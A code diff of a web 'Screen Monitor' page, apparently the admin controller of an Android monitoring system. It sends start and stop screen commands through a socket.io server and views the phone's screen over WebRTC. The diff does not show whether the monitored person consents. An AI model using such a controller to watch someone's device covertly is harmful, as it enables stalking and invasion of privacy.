@@ -2,9 +2,7 @@
 <html>
 <head>
     <title>Screen Monitor</title>
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-
     <style>
         body {
             background: #111;
@@ -12,19 +10,20 @@
             font-family: sans-serif;
             text-align: center;
         }
-
         video {
             width: 360px;
             height: 640px;
             background: black;
             border-radius: 20px;
+            border: 2px solid #333;
         }
-
         button {
             padding: 12px 25px;
             margin: 10px;
             font-size: 16px;
+            cursor: pointer;
         }
+        .controls { margin-top: 20px; }
     </style>
 </head>
 
@@ -32,23 +31,25 @@
 
     <h2>Screen Monitor</h2>
 
-    <input id="id" placeholder="Device ID">
+    <input id="id" placeholder="Enter Device ID" style="padding:10px;">
+    
+    <div class="controls">
+        <button onclick="start()" style="background:green; color:white;">START SCREEN</button>
+        <button onclick="stop()" style="background:red; color:white;">STOP</button>
+    </div>
+
     <br>
-
-    <button onclick="start()">START</button>
-    <button onclick="stop()">STOP</button>
-
-    <br><br>
-
     <video id="v" autoplay playsinline></video>
 
     <script>
         const socket = io("https://child-v9no.onrender.com");
 
         let pc;
-        let deviceId;
+        let deviceId; 
+        let targetId; // 🔥 Ye naya variable hai Screen ke liye
 
         socket.on("connect", () => {
+            console.log("Connected to Server");
             socket.emit("join-room", "ADMIN");
         });
 
@@ -56,6 +57,7 @@
         // RECEIVE OFFER FROM ANDROID
         // ===============================
         socket.on("offer", async d => {
+            console.log("Offer Received");
 
             pc = new RTCPeerConnection({
                 iceServers: [
@@ -64,13 +66,15 @@
             });
 
             pc.ontrack = e => {
+                console.log("Stream received!");
                 document.getElementById("v").srcObject = e.streams[0];
             };
 
             pc.onicecandidate = e => {
                 if (e.candidate) {
+                    // 🔥 IMPORTANT: Candidate wapas ScreenService (_screen) ko bhejna hai
                     socket.emit("candidate", {
-                        target: deviceId,
+                        target: targetId, 
                         candidate: e.candidate.candidate,
                         sdpMid: e.candidate.sdpMid,
                         sdpMLineIndex: e.candidate.sdpMLineIndex
@@ -86,27 +90,54 @@
             const ans = await pc.createAnswer();
             await pc.setLocalDescription(ans);
 
+            // 🔥 IMPORTANT: Answer wapas ScreenService (_screen) ko bhejna hai
             socket.emit("answer", {
-                target: deviceId,
+                target: targetId,
                 sdp: ans.sdp
             });
+        });
+
+        socket.on("candidate", async d => {
+            if(pc) {
+                try {
+                    await pc.addIceCandidate({
+                        candidate: d.candidate,
+                        sdpMid: d.sdpMid,
+                        sdpMLineIndex: d.sdpMLineIndex
+                    });
+                } catch (e) { console.error(e); }
+            }
         });
 
         // ===============================
         // BUTTON FUNCTIONS
         // ===============================
         function start() {
-            deviceId = document.getElementById("id").value;
+            // User jo ID dalega (e.g. 12345)
+            let rawId = document.getElementById("id").value;
+            
+            // 🔥 FIX: Hum "_screen" jod rahe hain taki command ScreenService ke paas jaye
+            // CameraService ke paas nahi
+            targetId = rawId + "_screen"; 
+
+            console.log("Starting Screen Share for: " + targetId);
 
             socket.emit("send-command", {
-                targetId: deviceId,
+                targetId: targetId, // Ab ye "12345_screen" pe jayega
                 command: "start_screen"
             });
         }
 
         function stop() {
+            if(!targetId) {
+                let rawId = document.getElementById("id").value;
+                targetId = rawId + "_screen";
+            }
+
+            console.log("Stopping: " + targetId);
+
             socket.emit("send-command", {
-                targetId: deviceId,
+                targetId: targetId,
                 command: "stop_screen"
             });
 
